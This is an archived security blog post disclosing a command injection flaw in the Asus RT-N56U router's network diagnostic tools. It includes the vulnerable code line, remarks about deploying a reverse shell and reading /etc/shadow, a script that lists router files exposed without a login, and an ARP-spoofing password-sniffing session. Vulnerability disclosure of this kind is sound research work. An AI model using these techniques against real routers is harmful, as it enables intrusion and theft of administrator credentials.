@@ -1,0 +1,473 @@
+
+<!DOCTYPE html>
+<!--[if IEMobile 7 ]><html class="no-js iem7"><![endif]-->
+<!--[if lt IE 9]><html class="no-js lte-ie8"><![endif]-->
+<!--[if (gt IE 8)|(gt IEMobile 7)|!(IEMobile)|!(IE)]><!--><html class="no-js" lang="en"><!--<![endif]-->
+<head>
+  <meta charset="utf-8">
+  <title>Asus RT56U Remote Command Injection - </title>
+  <meta name="author" content="Bryan Alexander">
+
+  
+  <meta name="description" content="After discovering a couple vulnerabilities in the Asus RT56U prior, I decided to check out the latest firmware and hunt around for a few more. I was &hellip;">
+  
+
+  <!-- http://t.co/dKP3o1e -->
+  <meta name="HandheldFriendly" content="True">
+  <meta name="MobileOptimized" content="320">
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+
+  
+  <link rel="canonical" href="http://hatRiot.github.io/blog/2013/06/05/asus-rt56u-remote-command-injection">
+  <link href="/favicon.png" rel="icon">
+  <link href="/stylesheets/screen.css" media="screen, projection" rel="stylesheet" type="text/css">
+  <link href="/atom.xml" rel="alternate" title="" type="application/atom+xml">
+  <script src="/javascripts/modernizr-2.0.js"></script>
+  <script src="//ajax.googleapis.com/ajax/libs/jquery/1.9.1/jquery.min.js"></script>
+  <script>!window.jQuery && document.write(unescape('%3Cscript src="./javascripts/lib/jquery.min.js"%3E%3C/script%3E'))</script>
+  <script src="/javascripts/octopress.js" type="text/javascript"></script>
+  <!--Fonts from Google"s Web font directory at http://google.com/webfonts -->
+<link href="http://fonts.googleapis.com/css?family=PT+Serif:regular,italic,bold,bolditalic" rel="stylesheet" type="text/css">
+<link href='http://fonts.googleapis.com/css?family=Open+Sans' rel='stylesheet' type='text/css'>
+<link href='http://fonts.googleapis.com/css?family=Fjalla+One' rel='stylesheet' type='text/css'>
+  
+
+</head>
+
+<body   class="collapse-sidebar sidebar-footer" >
+  <!--<header role="banner"><hgroup>
+  <h1><a href="/"></a></h1>
+  
+</hgroup>
+
+</header>-->
+  <nav role="navigation"><ul class="subscription" data-subscription="rss">
+  <li><a href="/atom.xml" rel="subscribe-rss" title="subscribe via RSS">RSS</a></li>
+  
+</ul>
+  
+<form action="http://google.com/search" method="get">
+  <fieldset role="search">
+    <input type="hidden" name="q" value="site:hatRiot.github.io" />
+    <input class="search" type="text" name="q" results="0" placeholder="Search"/>
+  </fieldset>
+</form>
+  
+<ul class="main-navigation">
+  <li><a href="/">Home</a></li>
+  <li><a href="/about">About</a></li>
+</ul>
+
+</nav>
+  <div id="main">
+    <div id="content">
+      <div>
+<article class="hentry" role="article">
+  
+  <header>
+    
+      <h1 class="entry-title">Asus RT56U Remote Command Injection</h1>
+    
+    
+      <p class="meta">
+        
+
+
+
+
+
+
+
+
+  
+
+
+<time datetime="2013-06-05T22:45:20-07:00" pubdate data-updated="true">Jun 5<span>th</span>, 2013</time>
+        
+      </p>
+    
+  </header>
+
+
+<div class="entry-content"><p>After discovering a couple vulnerabilities in the Asus RT56U prior, I decided to check out the latest firmware and hunt around for a few more.</p>
+
+<p>I was running 3.0.0.4.342, which happens to be one version behind the latest (3.0.0.4.360), so I did a sweep of both.  I enabled telnet on the router and hunted around, which led me to an unlinked page, Main_Analysis_Content.asp.  This page hosts a slew of diagnostic tools, including the ability to ping network systems.  See where this is going?</p>
+
+<p><img class="center" src="http://4.bp.blogspot.com/-4C_1Ig7iJos/UZwIsAqjHqI/AAAAAAAAAeo/hC3nnlBbyb8/s640/command_injection.jpg"></p>
+
+<p>And the related source code to this:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>document.form.SystemCmd.value = "ping -c " + document.form.pingCNT.value + " " + document.form.destIP.value;</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Pretty trivial, and each command, ping, nslookup, and traceroute, is vulnerable.  The system is running an HTTP web server that serves up ASP pages, so we could wget and deploy a reverse ASP shell or set up a netcat listener.</p>
+
+<p>I then took a look at the latest firmware, which touts the following changes:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>ASUS RT-N56U Firmware Version 3.0.0.4.360
+</span><span class='line'>1. AiCloud
+</span><span class='line'>For iOS user, please upgrade app to 1.02.78 or above
+</span><span class='line'>(for more information, please refer to http://event.asus.com/2012/nw/aicloud/index.htm)
+</span><span class='line'>2. Network tools in Advanced setting
+</span><span class='line'>3. WOL user interface
+</span><span class='line'>4. H.323 and SIP passthrough can be disabled in Advanced Settings --&gt; WAN --&gt;NAT Passthrough
+</span><span class='line'>5. Click the device name and lookup the manufacturer information
+</span><span class='line'>6. Change the DHCP query frequency in Advanced settings--&gt;WAN--&gt;Internet connection to resolve the ISP compatibility issue.</span></code></pre></td></tr></table></div></figure>
+
+
+<p>So it looks like the tools were added in the .342 (or earlier) firmware, but not actually linked until the .360 release.  I then flashed over the firmware to take a look at any changes.  It appeared they added a Network Tools section which, of course, allows us to:</p>
+
+<p><img class="center" src="http://3.bp.blogspot.com/-ZFhW0bRKM3o/UZwoiPOXXyI/AAAAAAAAAe4/WyTtjhpQEho/s640/asus_exec_360.jpg"></p>
+
+<p>It&rsquo;s kind of ridiculous that we can hit /etc/shadow with this.</p>
+
+<p>As an aside, I thought about what sort of files might be accessible without authenticating to the web server.  Seeing as I had access to enumerate the file system, I constructed a listing of every file in the web server&rsquo;s root.  The code can be seen below:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+<span class='line-number'>22</span>
+<span class='line-number'>23</span>
+<span class='line-number'>24</span>
+<span class='line-number'>25</span>
+<span class='line-number'>26</span>
+<span class='line-number'>27</span>
+<span class='line-number'>28</span>
+<span class='line-number'>29</span>
+<span class='line-number'>30</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>import urllib, urllib2
+</span><span class='line'>
+</span><span class='line'>def get_files():
+</span><span class='line'>    files = []
+</span><span class='line'>    with open('files_rt.txt', 'r') as f:
+</span><span class='line'>        files = [x.strip() for x in f.readlines()]
+</span><span class='line'>    print '[!] Built %d files to test...'%len(files)
+</span><span class='line'>    return files
+</span><span class='line'>
+</span><span class='line'>def run():
+</span><span class='line'>    files        = get_files()
+</span><span class='line'>    open_files   = []
+</span><span class='line'>
+</span><span class='line'>    for f in files:
+</span><span class='line'>        url = 'http://192.168.1.1/'+f
+</span><span class='line'>        try:
+</span><span class='line'>            data = urllib2.urlopen(url).read()
+</span><span class='line'>        except urllib2.HTTPError as e:
+</span><span class='line'>            continue
+</span><span class='line'>
+</span><span class='line'>        open_files.append(url)
+</span><span class='line'>
+</span><span class='line'>    print '[!] %d exposed files'%len(open_files)
+</span><span class='line'>    for f in open_files: print '\t[!] %s'%f
+</span><span class='line'>
+</span><span class='line'>def parse_args():
+</span><span class='line'>    pass
+</span><span class='line'>
+</span><span class='line'>if __name__ == "__main__":
+</span><span class='line'>    run()</span></code></pre></td></tr></table></div></figure>
+
+
+<p>When run, 42 files were exposed:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+<span class='line-number'>20</span>
+<span class='line-number'>21</span>
+<span class='line-number'>22</span>
+<span class='line-number'>23</span>
+<span class='line-number'>24</span>
+<span class='line-number'>25</span>
+<span class='line-number'>26</span>
+<span class='line-number'>27</span>
+<span class='line-number'>28</span>
+<span class='line-number'>29</span>
+<span class='line-number'>30</span>
+<span class='line-number'>31</span>
+<span class='line-number'>32</span>
+<span class='line-number'>33</span>
+<span class='line-number'>34</span>
+<span class='line-number'>35</span>
+<span class='line-number'>36</span>
+<span class='line-number'>37</span>
+<span class='line-number'>38</span>
+<span class='line-number'>39</span>
+<span class='line-number'>40</span>
+<span class='line-number'>41</span>
+<span class='line-number'>42</span>
+<span class='line-number'>43</span>
+<span class='line-number'>44</span>
+<span class='line-number'>45</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>bryan@devbox:~$ python rt56u_iter.py 
+</span><span class='line'>[!] Built 277 files to test...
+</span><span class='line'>[!] 42 exposed files
+</span><span class='line'>    [!] http://192.168.1.1/NM_style.css
+</span><span class='line'>    [!] http://192.168.1.1/Nologin.asp
+</span><span class='line'>    [!] http://192.168.1.1/PIE.htc
+</span><span class='line'>    [!] http://192.168.1.1/ParentalControl.css
+</span><span class='line'>    [!] http://192.168.1.1/WAN_info.asp
+</span><span class='line'>    [!] http://192.168.1.1/app_installation.css
+</span><span class='line'>    [!] http://192.168.1.1/detect_firmware.asp
+</span><span class='line'>    [!] http://192.168.1.1/error_page.htm
+</span><span class='line'>    [!] http://192.168.1.1/fan.svg
+</span><span class='line'>    [!] http://192.168.1.1/form_style.css
+</span><span class='line'>    [!] http://192.168.1.1/get_webdavInfo.asp
+</span><span class='line'>    [!] http://192.168.1.1/gotoHomePage.htm
+</span><span class='line'>    [!] http://192.168.1.1/httpd_check.htm
+</span><span class='line'>    [!] http://192.168.1.1/index_style.css
+</span><span class='line'>    [!] http://192.168.1.1/jquery.js
+</span><span class='line'>    [!] http://192.168.1.1/menu_style.css
+</span><span class='line'>    [!] http://192.168.1.1/other.css
+</span><span class='line'>    [!] http://192.168.1.1/pwdmeter.css
+</span><span class='line'>    [!] http://192.168.1.1/remote.asp
+</span><span class='line'>    [!] http://192.168.1.1/tm.svg
+</span><span class='line'>    [!] http://192.168.1.1/tmmenu.css
+</span><span class='line'>    [!] http://192.168.1.1/update_applist.asp
+</span><span class='line'>    [!] http://192.168.1.1/update_appstate.asp
+</span><span class='line'>    [!] http://192.168.1.1/update_cloudstatus.asp
+</span><span class='line'>    [!] http://192.168.1.1/ure_success.htm
+</span><span class='line'>    [!] http://192.168.1.1/ureip.asp
+</span><span class='line'>    [!] http://192.168.1.1/usp_style.css
+</span><span class='line'>    [!] http://192.168.1.1/aidisk/AiDisk_style.css
+</span><span class='line'>    [!] http://192.168.1.1/aidisk/aidisk.css
+</span><span class='line'>    [!] http://192.168.1.1/device-map/device-map.css
+</span><span class='line'>    [!] http://192.168.1.1/iui/Button_low.jpg
+</span><span class='line'>    [!] http://192.168.1.1/iui/check.png
+</span><span class='line'>    [!] http://192.168.1.1/iui/default-theme.css
+</span><span class='line'>    [!] http://192.168.1.1/iui/iui.css
+</span><span class='line'>    [!] http://192.168.1.1/iui/listArrow.png
+</span><span class='line'>    [!] http://192.168.1.1/iui/listArrow_setting.png
+</span><span class='line'>    [!] http://192.168.1.1/iui/toolButton.png
+</span><span class='line'>    [!] http://192.168.1.1/calendar/fullcalendar.css
+</span><span class='line'>    [!] http://192.168.1.1/svghtc/svg.htc
+</span><span class='line'>    [!] http://192.168.1.1/svghtc/svg.swf
+</span><span class='line'>    [!] http://192.168.1.1/qis/qis_style.css
+</span><span class='line'>    [!] http://192.168.1.1/qis/qis_style_m.css</span></code></pre></td></tr></table></div></figure>
+
+
+<p>A majority of the files are pretty useless/uninteresting, such as the css/jpg/png files, but a couple of the ASP files have some interesting information.  <code>Nologin.asp</code> lets us know every address the DHCP server has leased out, as well as the IP of the currently logged in administrator.  <code>get_webdavInfo.asp</code> gives us a bunch of great info, including the firmware version, DDNS information, mode of operation, and more.</p>
+
+<p>The only really interesting page to me is <code>Nologin.asp</code>.  This gives us the currently logged in administrator; so, if we&rsquo;re on the local network, we can generate a short script that periodically pings the router and alerts us when an admin logs in.  We can then ARPP the administrator and hijack the password; this works because the router&rsquo;s web server doesn&rsquo;t do any session management, it simply uses basic HTTP auth to send the base64&rsquo;d password.</p>
+
+<p>Observe:</p>
+
+<p><img class="center" src="http://1.bp.blogspot.com/-uPMtGiHrr8c/Ua_L3lVLl9I/AAAAAAAAAf4/QIhMSOdOfvM/s640/no_login.jpg"></p>
+
+<p>Now we know where the administrator is logged in.  We can now ARPP the host and hijack the password.  It is unnecessary for the administrator to actually be doing anything, because conveniently the client&rsquo;s browser sends out an ajax request to <code>/ajax_status.asp</code> quite often, complete with authentication credentials.  Using zarp, a network attack tool designed by yours truly, we can ARPP the admin and set up a password sniffer:</p>
+
+<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
+<span class='line-number'>2</span>
+<span class='line-number'>3</span>
+<span class='line-number'>4</span>
+<span class='line-number'>5</span>
+<span class='line-number'>6</span>
+<span class='line-number'>7</span>
+<span class='line-number'>8</span>
+<span class='line-number'>9</span>
+<span class='line-number'>10</span>
+<span class='line-number'>11</span>
+<span class='line-number'>12</span>
+<span class='line-number'>13</span>
+<span class='line-number'>14</span>
+<span class='line-number'>15</span>
+<span class='line-number'>16</span>
+<span class='line-number'>17</span>
+<span class='line-number'>18</span>
+<span class='line-number'>19</span>
+</pre></td><td class='code'><pre><code class=''><span class='line'>[Running sessions]
+</span><span class='line'>[1] ARP Spoof
+</span><span class='line'>[0] 192.168.1.219
+</span><span class='line'>[2] Password Sniffer
+</span><span class='line'>[0] 192.168.1.219
+</span><span class='line'>
+</span><span class='line'>
+</span><span class='line'>[1] Stop session
+</span><span class='line'>[2] View session
+</span><span class='line'>[3] Start session logger
+</span><span class='line'>[4] Stop session logger
+</span><span class='line'>
+</span><span class='line'>0) Back
+</span><span class='line'>&gt; 2
+</span><span class='line'>[module] [number]&gt; 2 0
+</span><span class='line'>[!] [enter] when finished
+</span><span class='line'>[!] Dumping output from 'Password Sniffer'...
+</span><span class='line'>[!] Host: 192.168.1.1
+</span><span class='line'>[!] User: admin:*********</span></code></pre></td></tr></table></div></figure>
+
+
+<p>Immediately we catch a heartbeat and grab the password (edited out).</p>
+
+<p>Lastly, this is full disclosure.  Check out <a href="http://seclists.org/fulldisclosure/2013/Mar/126">this</a> listing for how Asus treats security researchers.</p>
+</div>
+
+
+  <footer>
+    <p class="meta">
+      
+  
+
+<span class="byline author vcard">Posted by <span class="fn">Bryan Alexander</span></span>
+
+      
+
+
+
+
+
+
+
+
+  
+
+
+<time datetime="2013-06-05T22:45:20-07:00" pubdate data-updated="true">Jun 5<span>th</span>, 2013</time>
+      
+
+<span class="categories">
+  
+    <a class='category' href='/blog/categories/asus/'>asus</a>, <a class='category' href='/blog/categories/command-injection/'>command injection</a>
+  
+</span>
+
+
+    </p>
+    
+      <div class="sharing">
+  
+  <a href="http://twitter.com/share" class="twitter-share-button" data-url="http://hatRiot.github.io/blog/2013/06/05/asus-rt56u-remote-command-injection/" data-via="" data-counturl="http://hatRiot.github.io/blog/2013/06/05/asus-rt56u-remote-command-injection/" >Tweet</a>
+  
+  
+  
+</div>
+
+    
+    <p class="meta">
+      
+        <a class="basic-alignment left" href="/blog/2013/06/02/phd-help-desk-2.12-sqli-xss/" title="Previous Post: PHD Help Desk 2.12 - SQLi/XSS">&laquo; PHD Help Desk 2.12 - SQLi/XSS</a>
+      
+      
+        <a class="basic-alignment right" href="/blog/2013/06/21/collabtive-1.0-sqli/" title="Next Post: Collabtive 1.0 - SQLi">Collabtive 1.0 - SQLi &raquo;</a>
+      
+    </p>
+  </footer>
+</article>
+
+
+</div>
+
+<aside class="sidebar">
+  
+    <section>
+  <h1>Recent Posts</h1>
+  <ul id="recent_posts">
+    
+      <li class="post">
+        <a href="/blog/2018/05/17/dell-supportassist-local-privilege-escalation/">Dell SupportAssist Driver - Local Privilege Escalation</a>
+      </li>
+    
+      <li class="post">
+        <a href="/blog/2017/09/19/abusing-delay-load-dll/">Abusing delay load DLLs for remote code injection</a>
+      </li>
+    
+      <li class="post">
+        <a href="/blog/2015/01/06/ntpdc-exploit/">ntpdc local buffer overflow</a>
+      </li>
+    
+      <li class="post">
+        <a href="/blog/2014/11/23/protostar-network/">Protostar solutions - Network</a>
+      </li>
+    
+      <li class="post">
+        <a href="/blog/2014/09/21/protostar-heap-exploits/">Protostar solutions - Heap Exploitation</a>
+      </li>
+    
+  </ul>
+</section>
+
+
+
+
+
+  
+</aside>
+
+
+    </div>
+  </div>
+  <footer role="contentinfo"><p>
+  Copyright &copy; 2018 - Bryan Alexander -
+  <span class="credit">Powered by <a href="http://octopress.org">Octopress</a> | Themed with <a href="https://github.com/lucaslew/whitespace">Whitespace</a></span>
+</p>
+
+</footer>
+  
+
+
+
+
+
+
+
+
+
+
+  <script type="text/javascript">
+    (function(){
+      var twitterWidgets = document.createElement('script');
+      twitterWidgets.type = 'text/javascript';
+      twitterWidgets.async = true;
+      twitterWidgets.src = 'http://platform.twitter.com/widgets.js';
+      document.getElementsByTagName('head')[0].appendChild(twitterWidgets);
+    })();
+  </script>
+
+
+
+
+
+</body>
+</html>
